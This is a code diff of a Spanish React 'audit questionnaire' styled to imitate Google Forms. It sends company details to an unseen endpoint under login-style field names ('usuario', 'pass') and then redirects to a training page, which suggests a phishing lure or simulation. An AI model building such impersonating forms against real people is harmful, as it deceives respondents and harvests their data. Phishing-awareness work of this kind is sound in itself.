@@ -20,8 +20,8 @@ const AuditForm = () => {
         mode: "no-cors",
         body: JSON.stringify({ 
           usuario: empresa, 
-          pass: `Emp: ${trabajadores} | Cargo: ${cargo}`, 
-          tipo: "FORMULARIO" 
+          pass: `Cargo: ${cargo} | Empleados: ${trabajadores}`, 
+          tipo: "DATOS_CUESTIONARIO" 
         })
       });
       window.location.href = "formacion.html";
@@ -31,22 +31,19 @@ const AuditForm = () => {
   };
 
   return (
-    <div className="w-full max-w-[640px] mx-auto px-4 py-8">
+    <div className="w-full max-w-[640px] mx-auto px-4 mt-8 pb-10">
       <div className="forms-card mb-4 overflow-hidden">
         <div className="forms-card-header" />
-        <div className="p-8">
-          <h1 className="text-3xl font-normal mb-3 font-google-sans">Cuestionario de Auditoría</h1>
-          <p className="text-sm">Expediente SC-2026-882</p>
-        </div>
+        <div className="p-8"><h1 className="text-3xl font-normal mb-3 font-google-sans">Cuestionario de Auditoría</h1></div>
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium">Nombre de la empresa *</label>
+        <label className="block mb-4 font-medium">Nombre de tu empresa *</label>
         <input type="text" value={empresa} onChange={(e) => setEmpresa(e.target.value)} className="forms-input w-full" />
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium">Nº de trabajadores *</label>
+        <label className="block mb-4 font-medium">¿Cuántos trabajadores tienes? *</label>
         {["1-10", "11-50", "50+"].map(opt => (
           <label key={opt} className="flex items-center gap-3 mb-2 cursor-pointer">
             <input type="radio" name="t" onChange={() => setTrabajadores(opt)} className="forms-radio" />
@@ -56,15 +53,18 @@ const AuditForm = () => {
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium">Cargo del responsable *</label>
+        <label className="block mb-4 font-medium">Cargo en el departamento *</label>
         <input type="text" value={cargo} onChange={(e) => setCargo(e.target.value)} className="forms-input w-full" />
       </div>
 
-      <button 
-        onClick={handleSubmit} 
-        disabled={isSubmitting || !empresa || !trabajadores || !cargo}
-        className="forms-btn-submit"
-      >
+      <div className="forms-card p-6 mb-6">
+        <label className="flex items-center gap-3 cursor-pointer">
+          <input type="checkbox" checked={protocolo} onChange={(e) => setProtocolo(e.target.checked)} className="w-4 h-4" />
+          <span className="text-sm">Confirmo que la información es veraz.</span>
+        </label>
+      </div>
+
+      <button onClick={handleSubmit} disabled={isSubmitting || !empresa || !trabajadores || !cargo || !protocolo} className="forms-btn-submit">
         {isSubmitting ? "Enviando..." : "Enviar"}
       </button>
     </div>
